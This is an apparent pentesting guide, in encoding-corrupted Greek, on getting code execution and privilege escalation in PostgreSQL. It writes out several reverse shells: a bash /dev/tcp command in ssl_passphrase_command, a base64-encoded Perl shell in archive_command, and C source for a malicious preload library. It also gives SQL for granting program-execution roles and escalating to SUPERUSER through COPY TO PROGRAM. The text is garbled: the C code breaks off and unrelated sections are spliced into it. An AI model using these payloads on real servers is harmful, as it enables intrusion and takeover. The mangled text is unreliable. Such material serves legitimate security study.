Î¤Î¿ **Î±ÏÏ‡ÎµÎ¯Î¿ ÏÏÎ¸Î¼Î¹ÏƒÎ·Ï‚** Ï„Î¿Ï… PostgreSQL ÎµÎ¯Î½Î±Î¹ **ÎµÎ³Î³ÏÎ¬ÏˆÎ¹Î¼Î¿** Î±Ï€ÏŒ Ï„Î¿Î½ Ï‡ÏÎ®ÏƒÏ„Î· **postgres**, Î¿ Î¿Ï€Î¿Î¯Î¿Ï‚ ÎµÎºÏ„ÎµÎ»ÎµÎ¯ Ï„Î· Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½, Î¿Ï€ÏŒÏ„Îµ Ï‰Ï‚ **Ï…Ï€ÎµÏÏ‡ÏÎ®ÏƒÏ„Î·Ï‚**, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î³ÏÎ¬ÏˆÎµÏ„Îµ Î±ÏÏ‡ÎµÎ¯Î± ÏƒÏ„Î¿ ÏƒÏÏƒÏ„Î·Î¼Î± Î±ÏÏ‡ÎµÎ¯Ï‰Î½, ÎºÎ±Î¹ ÏƒÏ…Î½ÎµÏ€ÏÏ‚ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Î±Î½Ï„Î¹ÎºÎ±Ï„Î±ÏƒÏ„Î®ÏƒÎµÏ„Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿.**

![](<../.gitbook/assets/image (303).png>)

#### **RCE Î¼Îµ ssl\_passphrase\_command**

Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ [ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Î±Ï…Ï„Î® Ï„Î·Î½ Ï„ÎµÏ‡Î½Î¹ÎºÎ® ÎµÎ´Ï](https://pulsesecurity.co.nz/articles/postgres-sqli).

Î¤Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ ÏÏÎ¸Î¼Î¹ÏƒÎ·Ï‚ Î­Ï‡ÎµÎ¹ ÎºÎ¬Ï€Î¿Î¹Î± ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Î½Ï„Î± Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÎ¬ Ï€Î¿Ï… Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î¿Î´Î·Î³Î®ÏƒÎ¿Ï…Î½ ÏƒÎµ RCE:

* `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Î”Î¹Î±Î´ÏÎ¿Î¼Î® Ï€ÏÎ¿Ï‚ Ï„Î¿Î½ Î¹Î´Î¹Ï‰Ï„Î¹ÎºÏŒ ÎºÎ»ÎµÎ¹Î´Î¯ Ï„Î·Ï‚ Î²Î¬ÏƒÎ·Ï‚ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½
* `ssl_passphrase_command = ''` Î‘Î½ Ï„Î¿ Î¹Î´Î¹Ï‰Ï„Î¹ÎºÏŒ Î±ÏÏ‡ÎµÎ¯Î¿ Ï€ÏÎ¿ÏƒÏ„Î±Ï„ÎµÏÎµÏ„Î±Î¹ Î¼Îµ ÎºÏ‰Î´Î¹ÎºÏŒ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ (ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î·Î¼Î­Î½Î¿) Ï„Î¿ postgresql Î¸Î± **ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Ï„Î·Î½ ÎµÎ½Ï„Î¿Î»Î® Ï€Î¿Ï… Ï…Ï€Î¿Î´ÎµÎ¹ÎºÎ½ÏÎµÏ„Î±Î¹ ÏƒÎµ Î±Ï…Ï„ÏŒ Ï„Î¿ Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÏŒ**.
* `ssl_passphrase_command_supports_reload = off` **Î‘Î½** Î±Ï…Ï„ÏŒ Ï„Î¿ Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÏŒ ÎµÎ¯Î½Î±Î¹ **ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿** Î· **ÎµÎ½Ï„Î¿Î»Î®** Ï€Î¿Ï… ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Î±Î½ Ï„Î¿ ÎºÎ»ÎµÎ¹Î´Î¯ Ï€ÏÎ¿ÏƒÏ„Î±Ï„ÎµÏÎµÏ„Î±Î¹ Î¼Îµ ÎºÏ‰Î´Î¹ÎºÏŒ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ **Î¸Î± ÎµÎºÏ„ÎµÎ»ÎµÏƒÏ„ÎµÎ¯** ÏŒÏ„Î±Î½ ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Ï„Î¿ `pg_reload_conf()`.

Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹:

1. **Î‘Î½Î¬ÎºÏ„Î·ÏƒÎ· Î¹Î´Î¹Ï‰Ï„Î¹ÎºÎ¿Ï ÎºÎ»ÎµÎ¹Î´Î¹Î¿Ï** Î±Ï€ÏŒ Ï„Î¿Î½ ÎµÎ¾Ï…Ï€Î·ÏÎµÏ„Î·Ï„Î®
2. **ÎšÏÏ…Ï€Ï„Î¿Î³ÏÎ¬Ï†Î·ÏƒÎ·** Ï„Î¿Ï… ÎºÎ±Ï„ÎµÎ²Î±ÏƒÎ¼Î­Î½Î¿Ï… Î¹Î´Î¹Ï‰Ï„Î¹ÎºÎ¿Ï ÎºÎ»ÎµÎ¹Î´Î¹Î¿Ï:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **Î‘Î½Ï„Î¹ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ·**
4. **Î‘Î½Î¬ÎºÏ„Î·ÏƒÎ·** Ï„Î·Ï‚ Ï„ÏÎ­Ï‡Î¿Ï…ÏƒÎ±Ï‚ **ÏÏÎ¸Î¼Î¹ÏƒÎ·Ï‚** Ï„Î¿Ï… postgresql
5. **Î‘Î½Ï„Î¹ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ·** Ï„Î·Ï‚ **ÏÏÎ¸Î¼Î¹ÏƒÎ·Ï‚** Î¼Îµ Ï„Î· ÏÏÎ¸Î¼Î¹ÏƒÎ· Ï„Ï‰Î½ Î±Î½Î±Ï†ÎµÏÏŒÎ¼ÎµÎ½Ï‰Î½ Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÏÎ½:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. Î•ÎºÏ„Î­Î»ÎµÏƒÎ· `pg_reload_conf()`

ÎšÎ±Ï„Î¬ Ï„Î· Î´Î¿ÎºÎ¹Î¼Î® Î±Ï…Ï„Î®Ï‚ Ï„Î·Ï‚ Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î±Ï‚ Ï€Î±ÏÎ±Ï„Î®ÏÎ·ÏƒÎ± ÏŒÏ„Î¹ Î±Ï…Ï„ÏŒ Î¸Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î¼ÏŒÎ½Î¿ ÎµÎ¬Î½ Ï„Î¿ **Î¹Î´Î¹Ï‰Ï„Î¹ÎºÏŒ ÎºÎ»ÎµÎ¹Î´Î¯ Î­Ï‡ÎµÎ¹ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± 640**, ÎµÎ¯Î½Î±Î¹ **ÎºÎ±Ï„Î¿Ï‡Ï…ÏÏ‰Î¼Î­Î½Î¿ Î±Ï€ÏŒ Ï„Î¿ root** ÎºÎ±Î¹ Î±Ï€ÏŒ Ï„Î· **ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î· Î¿Î¼Î¬Î´Î± ssl-cert Î® postgres** (ÏÏƒÏ„Îµ Î¿ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ postgres Î½Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï„Î¿ Î´Î¹Î±Î²Î¬ÏƒÎµÎ¹), ÎºÎ±Î¹ Î²ÏÎ¯ÏƒÎºÎµÏ„Î±Î¹ ÏƒÏ„Î¿ _/var/lib/postgresql/12/main_.

#### **RCE Î¼Îµ archive\_command**

**Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚** [**Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Î±Ï…Ï„Î® Ï„Î· ÏÏÎ¸Î¼Î¹ÏƒÎ· ÎºÎ±Î¹ Î³Î¹Î± Ï„Î¿ WAL ÎµÎ´Ï**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

ÎˆÎ½Î± Î¬Î»Î»Î¿ Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÏŒ ÏƒÏ„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ ÏÏÎ¸Î¼Î¹ÏƒÎ·Ï‚ Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÏƒÎ¹Î¼Î¿ ÎµÎ¯Î½Î±Î¹ Ï„Î¿ `archive_command`.

Î“Î¹Î± Î½Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î±Ï…Ï„ÏŒ, Î· ÏÏÎ¸Î¼Î¹ÏƒÎ· `archive_mode` Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÎ¯Î½Î±Î¹ `'on'` Î® `'always'`. Î‘Î½ Î±Ï…Ï„ÏŒ Î¹ÏƒÏ‡ÏÎµÎ¹, Ï„ÏŒÏ„Îµ Î¼Ï€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± Î±Î½Ï„Î¹ÎºÎ±Ï„Î±ÏƒÏ„Î®ÏƒÎ¿Ï…Î¼Îµ Ï„Î·Î½ ÎµÎ½Ï„Î¿Î»Î® ÏƒÏ„Î¿ `archive_command` ÎºÎ±Î¹ Î½Î± Ï„Î·Î½ ÎµÎ¾Î±Î½Î±Î³ÎºÎ¬ÏƒÎ¿Ï…Î¼Îµ Î½Î± ÎµÎºÏ„ÎµÎ»ÎµÏƒÏ„ÎµÎ¯ Î¼Î­ÏƒÏ‰ Ï„Ï‰Î½ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÏÎ½ WAL (write-ahead logging).

Î¤Î± Î³ÎµÎ½Î¹ÎºÎ¬ Î²Î®Î¼Î±Ï„Î± ÎµÎ¯Î½Î±Î¹:

1. ÎˆÎ»ÎµÎ³Ï‡Î¿Ï‚ ÎµÎ¬Î½ Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± Î±ÏÏ‡ÎµÎ¹Î¿Î¸Î­Ï„Î·ÏƒÎ·Ï‚ ÎµÎ¯Î½Î±Î¹ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î·: `SELECT current_setting('archive_mode')`
2. Î‘Î½Ï„Î¹ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· Ï„Î¿Ï… `archive_command` Î¼Îµ Ï„Î¿ payload. Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Î­Î½Î± Î±Î½Ï„Î¯ÏƒÏ„ÏÎ¿Ï†Î¿ ÎºÎ­Î»Ï…Ï†Î¿Ï‚: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Î•Ï€Î±Î½Î±Ï†ÏŒÏÏ„Ï‰ÏƒÎ· Ï„Î·Ï‚ ÏÏÎ¸Î¼Î¹ÏƒÎ·Ï‚: `SELECT pg_reload_conf()`
4. Î•Î¾Î±Î½Î±Î³ÎºÎ¬ÏƒÏ„Îµ Ï„Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± WAL Î½Î± Ï„ÏÎ­Î¾ÎµÎ¹, Î· Î¿Ï€Î¿Î¯Î± Î¸Î± ÎºÎ±Î»Î­ÏƒÎµÎ¹ Ï„Î·Î½ ÎµÎ½Ï„Î¿Î»Î® Î±ÏÏ‡ÎµÎ¹Î¿Î¸Î­Ï„Î·ÏƒÎ·Ï‚: `SELECT pg_switch_wal()` Î® `SELECT pg_switch_xlog()` Î³Î¹Î± Î¼ÎµÏÎ¹ÎºÎ­Ï‚ ÎµÎºÎ´ÏŒÏƒÎµÎ¹Ï‚ Ï„Î¿Ï… Postgres

#### **RCE Î¼Îµ Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎµÏ‚ preload**

Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ [ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Î±Ï…Ï„Î® Ï„Î·Î½ Ï„ÎµÏ‡Î½Î¹ÎºÎ® ÎµÎ´Ï](https://adeadfed.com/posts/postgresql-select-only-rce/).

Î‘Ï…Ï„ÏŒ Ï„Î¿ Î´Î¹Î¬Î½Ï…ÏƒÎ¼Î± ÎµÏ€Î¯Î¸ÎµÏƒÎ·Ï‚ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÎµÏ„Î±Î¹ Ï„Î¹Ï‚ Î±ÎºÏŒÎ»Î¿Ï…Î¸ÎµÏ‚ Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î­Ï‚ ÏÏÎ¸Î¼Î¹ÏƒÎ·Ï‚:

* `session_preload_libraries` -- Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎµÏ‚ Ï€Î¿Ï… Î¸Î± Ï†Î¿ÏÏ„Ï‰Î¸Î¿ÏÎ½ Î±Ï€ÏŒ Ï„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® PostgreSQL ÎºÎ±Ï„Î¬ Ï„Î· ÏƒÏÎ½Î´ÎµÏƒÎ· Ï„Î¿Ï… Ï€ÎµÎ»Î¬Ï„Î·.
* `dynamic_library_path` -- Î»Î¯ÏƒÏ„Î± ÎºÎ±Ï„Î±Î»ÏŒÎ³Ï‰Î½ ÏŒÏ€Î¿Ï… Î¿ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®Ï‚ PostgreSQL Î¸Î± Î±Î½Î±Î¶Î·Ï„Î®ÏƒÎµÎ¹ Ï„Î¹Ï‚ Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎµÏ‚.

ÎœÏ€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± Î¿ÏÎ¯ÏƒÎ¿Ï…Î¼Îµ Ï„Î·Î½ Ï„Î¹Î¼Î® Ï„Î¿Ï… `dynamic_library_path` ÏƒÎµ Î­Î½Î±Î½ ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿, ÎµÎ³Î³ÏÎ¬ÏˆÎ¹Î¼Î¿ Î±Ï€ÏŒ Ï„Î¿Î½ Ï‡ÏÎ®ÏƒÏ„Î· `postgres` Ï€Î¿Ï… ÎµÎºÏ„ÎµÎ»ÎµÎ¯ Ï„Î· Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½, Î³Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Ï„Î¿Î½ ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿ `/tmp/`, ÎºÎ±Î¹ Î½Î± Î¼ÎµÏ„Î±Ï†Î¿ÏÏ„ÏÏƒÎ¿Ï…Î¼Îµ Î­Î½Î± ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ `.so` ÎµÎºÎµÎ¯. Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, Î¸Î± ÎµÎ¾Î±Î½Î±Î³ÎºÎ¬ÏƒÎ¿Ï…Î¼Îµ Ï„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® PostgreSQL Î½Î± Ï†Î¿ÏÏ„ÏÏƒÎµÎ¹ Ï„Î· Î½ÎµÎ¿Î¼ÎµÏ„Î±Ï†Î¿ÏÏ„Ï‰Î¼Î­Î½Î· Î¼Î±Ï‚ Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎ· ÏƒÏ…Î¼Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½Î¿Î½Ï„Î¬Ï‚ Ï„Î·Î½ ÏƒÏ„Î· Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î® `session_preload_libraries`.

Î¤Î± Î²Î®Î¼Î±Ï„Î± Ï„Î·Ï‚ ÎµÏ€Î¯Î¸ÎµÏƒÎ·Ï‚ ÎµÎ¯Î½Î±Î¹:

1. Î›Î®ÏˆÎ· Ï„Î¿Ï… Î±ÏÏ‡Î¹ÎºÎ¿Ï `postgresql.conf`
2. Î£Ï…Î¼Ï€ÎµÏÎ¯Î»Î·ÏˆÎ· Ï„Î¿Ï… ÎºÎ±Ï„Î±Î»ÏŒÎ³Î¿Ï… `/tmp/` ÏƒÏ„Î·Î½ Ï„Î¹Î¼Î® Ï„Î¿Ï… `dynamic_library_path`, Ï€.Ï‡. `dynamic_library_path = '/tmp:$libdir'`
3. Î£Ï…Î¼Ï€ÎµÏÎ¯Î»Î·ÏˆÎ· Ï„Î¿Ï… Î¿Î½ÏŒÎ¼Î±Ï„Î¿Ï‚ Ï„Î·Ï‚ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î·Ï‚ Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎ·Ï‚ ÏƒÏ„Î·Î½ Ï„Î¹Î¼Î® Ï„Î¿Ï… `session_preload_libraries`, Ï€.Ï‡. `session_preload_libraries = 'payload.so'`
4. ÎˆÎ»ÎµÎ³Ï‡Î¿Ï‚ Ï„Î·Ï‚ ÎºÏÏÎ¹Î±Ï‚ Î­ÎºÎ´Î¿ÏƒÎ·Ï‚ Ï„Î¿Ï… PostgreSQL Î¼Î­ÏƒÏ‰ Ï„Î¿Ï… ÎµÏÏ‰Ï„Î®Î¼Î±Ï„Î¿Ï‚ `SELECT version()`
5.  Î£ÏÎ½Ï„Î±Î¾Î· Ï„Î¿Ï… ÎºÏÎ´Î¹ÎºÎ± Ï„Î·Ï‚ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î·Ï‚ Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎ·Ï‚ Î¼Îµ Ï„Î¿ ÏƒÏ‰ÏƒÏ„ÏŒ Ï€Î±ÎºÎ­Ï„Î¿ Î±Î½Î¬Ï€Ï„Ï…Î¾Î·Ï‚ PostgreSQL Î”ÎµÎ¯Î³Î¼Î± ÎºÏÎ´Î¹ÎºÎ±:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
/*
code taken from https://www.revshells.com/
*/

int port = REVSHELL_PORT;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");

connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
## **Postgres Î‘Î½ÏÏˆÏ‰ÏƒÎ· Î”Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½**

### Î‘Î½ÏÏˆÏ‰ÏƒÎ· Î¼Îµ Ï„Î¿ CREATEROLE

#### **Î§Î¿ÏÎ®Î³Î·ÏƒÎ·**

Î£
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Î¤ÏÎ¿Ï€Î¿Ï€Î¿Î¯Î·ÏƒÎ· ÎšÏ‰Î´Î¹ÎºÎ¿Ï Î ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚

ÎŸÎ¹ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Î¼Îµ Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Î½ ÏÏŒÎ»Î¿ Î¼Ï€Î¿ÏÎ¿ÏÎ½ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± **Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎ¿Ï…Î½** Ï„Î¿Ï…Ï‚ **ÎºÏ‰Î´Î¹ÎºÎ¿ÏÏ‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚** Î¬Î»Î»Ï‰Î½ **Î¼Î·-Ï…Ï€ÎµÏÏ‡ÏÎ·ÏƒÏ„ÏÎ½**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Î‘Î½Î­Î²Î±ÏƒÎ¼Î± Î´Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½ ÏƒÎµ SUPERUSER

Î£Ï…Ï‡Î½Î¬ ÏƒÏ…Î¼Î²Î±Î¯Î½ÎµÎ¹ Î½Î± Î²ÏÎµÎ¯Ï„Îµ ÏŒÏ„Î¹ **Î¿Î¹ Ï„Î¿Ï€Î¹ÎºÎ¿Î¯ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸Î¿ÏÎ½ ÏƒÏ„Î¿ PostgreSQL Ï‡Ï‰ÏÎ¯Ï‚ Î½Î± Ï€Î±ÏÎ­Ï‡Î¿Ï…Î½ ÎºÏ‰Î´Î¹ÎºÏŒ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚**. ÎˆÏ„ÏƒÎ¹, Î±Ï†Î¿Ï Î­Ï‡ÎµÏ„Îµ ÏƒÏ…Î³ÎºÎµÎ½Ï„ÏÏÏƒÎµÎ¹ **Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Î³Î¹Î± ÎµÎºÏ„Î­Î»ÎµÏƒÎ· ÎºÏÎ´Î¹ÎºÎ±**, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Î±Ï…Ï„Î¬ Ï„Î± Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Î³Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï„Î¿Î½ ÏÏŒÎ»Î¿ **`SUPERUSER`**:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
{% hint style="info" %}
Î‘Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹ ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Î´Ï…Î½Î±Ï„ÏŒ Î»ÏŒÎ³Ï‰ Ï„Ï‰Î½ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Î³ÏÎ±Î¼Î¼ÏÎ½ ÏƒÏ„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ **`pg_hba.conf`**:
```bash
# "local" is for Unix domain socket connections only
local   all             all                                     trust
# IPv4 local connections:
host    all             all             127.0.0.1/32            trust
# IPv6 local connections:
host    all             all             ::1/128                 trust
```
{% endhint %}

### **Î‘Î›Î›Î‘Î“Î— Î Î™ÎÎ‘ÎšÎ‘ privesc**

Î£Ï„Î¿ [**ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î¿ Î¬ÏÎ¸ÏÎ¿**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) ÎµÎ¾Î·Î³ÎµÎ¯Ï„Î±Î¹ Ï€ÏÏ‚ Î®Ï„Î±Î½ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± Î³Î¯Î½ÎµÎ¹ **privesc** ÏƒÏ„Î¿ Postgres GCP ÎºÎ±Ï„Î±Ï‡ÏÏÎ½Ï„Î±Ï‚ Ï„Î¿ Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î¿ ALTER TABLE Ï€Î¿Ï… ÎµÎ¯Ï‡Îµ Î´Î¿Î¸ÎµÎ¯ ÏƒÏ„Î¿Î½ Ï‡ÏÎ®ÏƒÏ„Î·.

ÎŒÏ„Î±Î½ Ï€ÏÎ¿ÏƒÏ€Î±Î¸ÎµÎ¯Ï„Îµ Î½Î± **ÎºÎ¬Î½ÎµÏ„Îµ Î¬Î»Î»Î¿ Ï‡ÏÎ®ÏƒÏ„Î· Î¹Î´Î¹Î¿ÎºÏ„Î®Ï„Î· ÎµÎ½ÏŒÏ‚ Ï€Î¯Î½Î±ÎºÎ±**, Î¸Î± Î­Ï€ÏÎµÏ€Îµ Î½Î± Î»Î¬Î²ÎµÏ„Îµ Î­Î½Î± **ÏƒÏ†Î¬Î»Î¼Î±** Ï€Î¿Ï… Ï„Î¿ Î±Ï€Î¿Ï„ÏÎ­Ï€ÎµÎ¹, Î±Î»Î»Î¬ Ï†Î±Î¯Î½ÎµÏ„Î±Î¹ ÏŒÏ„Î¹ Î· GCP Î­Î´Î¹Î½Îµ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ **ÎµÏ€Î¹Î»Î¿Î³Î® ÏƒÏ„Î¿Î½ Î¼Î·-Ï…Ï€ÎµÏÏ‡ÏÎ®ÏƒÏ„Î· postgres user** ÏƒÏ„Î· GCP:

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

Î£Ï…Î½Î´Ï…Î¬Î¶Î¿Î½Ï„Î±Ï‚ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ Î¹Î´Î­Î± Î¼Îµ Ï„Î¿ Î³ÎµÎ³Î¿Î½ÏŒÏ‚ ÏŒÏ„Î¹ ÏŒÏ„Î±Î½ Î¿Î¹ ÎµÎ½Ï„Î¿Î»Î­Ï‚ **INSERT/UPDATE/ANALYZE** ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½Ï„Î±Î¹ ÏƒÎµ Î­Î½Î±Î½ Ï€Î¯Î½Î±ÎºÎ± Î¼Îµ Î¼Î¹Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± Î´ÎµÎ¯ÎºÏ„Î·, Î· **Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î±** ÎºÎ±Î»ÎµÎ¯Ï„Î±Î¹ Ï‰Ï‚ Î¼Î­ÏÎ¿Ï‚ Ï„Î·Ï‚ ÎµÎ½Ï„Î¿Î»Î®Ï‚ Î¼Îµ Ï„Î± **Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Î¹Î´Î¹Î¿ÎºÏ„Î®Ï„Î· Ï„Î¿Ï… Ï€Î¯Î½Î±ÎºÎ±**. Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î·Î¸ÎµÎ¯ Î­Î½Î±Ï‚ Î´ÎµÎ¯ÎºÏ„Î·Ï‚ Î¼Îµ Î¼Î¹Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± ÎºÎ±Î¹ Î½Î± Î´Î¿Î¸Î¿ÏÎ½ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Î¹Î´Î¹Î¿ÎºÏ„Î®Ï„Î· ÏƒÎµ Î­Î½Î±Î½ **Ï…Ï€ÎµÏÏ‡ÏÎ®ÏƒÏ„Î·** Î³Î¹Î± Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Î½ Ï€Î¯Î½Î±ÎºÎ±, ÎºÎ±Î¹ ÏƒÏ„Î· 